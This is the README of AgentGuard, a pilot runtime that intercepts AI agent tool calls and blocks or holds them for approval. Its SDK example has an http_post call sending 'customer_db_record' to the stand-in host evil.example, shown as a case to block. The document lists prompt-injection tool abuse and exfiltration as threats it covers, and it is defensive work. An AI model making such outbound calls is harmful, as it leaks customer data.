# Aegotrax (runtime core)

Runtime protection for AI agents — checks tool calls before they run.

Public site: https://aegotrax.com

This repository contains the open pilot runtime (package name in code: `agentguard`).

**Status:** Pilot / local evaluation — not a production certification.

---

# AgentGuard v0.2 — Pilot-Ready Runtime Security for AI Agents

Runtime protection for autonomous agents: **intercept tool calls**, evaluate **intent + data provenance**, and **block or require approval** before sensitive actions run.

Supports:
- **MCP Gateway** (stdio) for agent frameworks
- **Python SDK** for direct integration with your existing tools

---

## Install

```bash
pip install .
# with LangGraph demo deps:
pip install ".[demo]"

Commands after install:
agentguard-engine   # Risk Engine → http://127.0.0.1:8000
agentguard-gateway  # MCP Gateway (stdio)

Health check:
curl http://127.0.0.1:8000/health

Docker alternative:
git clone https://github.com/benshalomofek/aegotrax.git
cd aegotrax
docker compose up --build
curl http://127.0.0.1:8000/health

Pilot integration (SDK — recommended)

from agentguard import verify_tool_call, set_session_context, protected_tool

# 1) Register user intent for this session
set_session_context("sess-42", user_intent="Summarize the ticket only")

# 2) Before every tool call
result = verify_tool_call(
    session_id="sess-42",
    agent_id="support-agent",
    user_intent="Summarize the ticket only",
    tool="http_post",
    arguments={"url": "https://evil.example", "data": "customer_db_record"},
)

if result["decision"] == "BLOCK":
    raise PermissionError(result["reasons"])

# 3) Or decorate your real functions
@protected_tool(
    session_id_fn=lambda: "sess-42",
    agent_id_fn=lambda: "support-agent",
    user_intent_fn=lambda: "Summarize the ticket only",
)
def send_email(to: str, body: str):
    ...

Configuration (environment)
Variable,Default,Purpose
AGENTGUARD_API_KEY,—,"If set, required as X-API-Key on engine APIs"
AGENTGUARD_POLICY_PATH,package policy,Custom policy.yaml
AGENTGUARD_AUDIT_LOG,agentguard_audit.log,Audit file path
AGENTGUARD_MODE,simulate,Gateway: simulate / echo / forward
AGENTGUARD_FAIL_CLOSED,true,Block when engine unreachable
AGENTGUARD_APPROVAL_WEBHOOK,—,POST events when REQUIRE_APPROVAL
AGENTGUARD_HOST / PORT,127.0.0.1 / 8000,Engine bind

Engine API (pilot)
Method,Path,Description
GET,/health,Liveness
POST,/verify-multi-agent,Main decision API
POST,/session,Set session intent
POST,/session/reset,Clear session provenance
GET,/session/{id},Inspect session
POST,/policy/reload,Reload policy without restart

Threats covered

Indirect prompt injection leading to tool abuse
Data provenance / multi-hop exfiltration
Intent constraint violations (“summarize only” → outbound)
Dangerous script execution


Feedback & problems
This is a pilot. Feedback (good or bad) shapes the next release.
Something broken or unclear?

GitHub Issues (preferred for bugs and technical problems)

→ Open an IssuePlease include when you can:
What you ran (Docker or pip)
What you expected vs what happened
Relevant redacted lines from the audit log
Do not paste API keys, passwords, or real customer data

Product / pilot questions

→ Contact form on aegotrax.com

Useful issue types
Type,Example
Install / setup,"Engine won’t start, Docker health fails"
False block,Legitimate tool call blocked
Missed block,Risky call was allowed
Docs,README step unclear

Replies are best-effort (no SLA). This is not a production support channel.

License
Apache-2.0